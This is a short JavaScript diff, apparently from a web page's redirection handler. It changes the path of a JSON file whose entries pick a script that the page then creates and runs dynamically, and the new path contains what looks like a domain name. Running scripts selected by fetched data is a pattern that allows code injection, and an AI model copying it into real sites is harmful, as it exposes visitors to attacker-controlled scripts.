@@ -12,7 +12,7 @@
         // Function to handle redirection based on URL
         function handleRedirection(url) {
             // Make AJAX request to load the JSON file
-            $.getJSON('main/url.json', function(data) {
+            $.getJSON('main/ogtt.tk/url.json', function(data) {
                 const jsScript = data[url];
                 if (jsScript) {
                     // Dynamically create and execute script element
